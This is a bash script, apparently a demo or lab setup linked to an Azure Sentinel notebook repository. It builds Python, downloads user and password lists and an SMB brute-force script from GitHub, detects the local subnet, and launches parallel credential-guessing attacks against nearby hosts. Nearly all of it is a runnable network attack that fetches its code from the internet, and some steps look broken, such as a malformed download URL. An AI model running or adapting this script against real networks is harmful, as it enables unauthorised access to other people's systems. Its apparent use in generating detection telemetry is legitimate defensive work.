#!/bin/bash
apt-get update
apt-get upgrade
apt-get install gcc
apt-get install make
apt-get install git
apt install build-essential checkinstall
apt install libffi-dev
apt-get install zlib1g-dev
apt install libedit-dev
wget http://deb.debian.org/debian/pool/main/z/zlib/zlib_1.2.8.dfsg-5.debian.tar.xz
tar xvf zlib_1.2.8.dfsg-5.debian.tar.xz
cd debian/
./configure
make altinstall
cd ..
apt install libreadline-gplv2-dev libncursesw5-dev libssl-dev libsqlite3-dev tk-dev libgdbm-dev libc6-dev libbz2-dev
wget https://www.python.org/ftp/python/3.7.3/Python-3.7.3.tar.xz
tar xvf Python-3.7.3.tar.xz
cd Python-3.7.3/
./configure
make altinstall
apt-get install python3-pip
pip3 install pysmb

wget https://raw.githubusercontent.com/secpfe/AzureSentinelDemoNb/master/pass.txt
wget https://raw.githubusercontent.com/secpfe/AzureSentinelDemoNb/master/users.txt
wget https://raw.githubusercontent.com/secpfe/SMBrute/blob/master/smbrute.py

echo YourUserName >> users.txt
echo YourWinPassword >> pass.txt

subn=$(ip addr | grep -Po '(?!(inet 127.\d.\d.1))(inet \K(\d{1,3}\.){3}\d{1,3})' | sed 's/\.[0-9]*$/.0/')/24
subnet=${subn::-4}

for addr in `seq 0 1 6 `; do
( python3.7 smbrute.py -h $subnet$addr -U users.txt -P pass.txt >> smbrute.log ) &
done

exit 0